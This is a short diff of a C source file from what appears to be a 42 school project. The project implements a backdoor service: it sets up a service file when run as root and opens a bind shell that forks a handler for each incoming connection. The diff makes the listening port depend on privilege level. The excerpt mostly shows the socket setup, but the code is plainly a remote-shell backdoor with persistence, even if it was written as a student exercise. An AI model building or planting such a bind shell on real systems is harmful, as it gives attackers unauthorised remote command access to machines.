@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/04/18 15:18:30 by mbatty            #+#    #+#             */
-/*   Updated: 2026/04/19 11:03:53 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/05/23 11:17:00 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -38,7 +38,7 @@ static int	setup_service_file()
 	return (0);
 }
 
-static int	run_bind_shell(void)
+static int	run_bind_shell(t_service_ctx *ctx)
 {
 	int				srv_fd;
 	int				cli_fd;
@@ -54,7 +54,7 @@ static int	run_bind_shell(void)
 
 	addr.sin_family = AF_INET;
 	addr.sin_addr.s_addr = INADDR_ANY;
-	addr.sin_port = htons(BIND_SHELL_PORT);
+	addr.sin_port = htons(ctx->super_user ? SUPER_USER_BIND_SHELL_PORT : WEAK_BIND_SHELL_PORT);
 
 	if (bind(srv_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
 	{
@@ -72,7 +72,7 @@ static int	run_bind_shell(void)
 	{
 		cli_fd = accept(srv_fd, NULL, NULL);
 		if (cli_fd == -1)
-			continue;
+			continue ;
 
 		if (fork() == 0)
 		{
@@ -102,7 +102,7 @@ int	run_service()
 	if (ctx.super_user)
 		setup_service_file();
 
-	run_bind_shell();
+	run_bind_shell(&ctx);
 
 	return (unlock_lock(&ctx, ctx.super_user ? SUPER_USER_LOCK_FILE : WEAK_LOCK_FILE));
 }
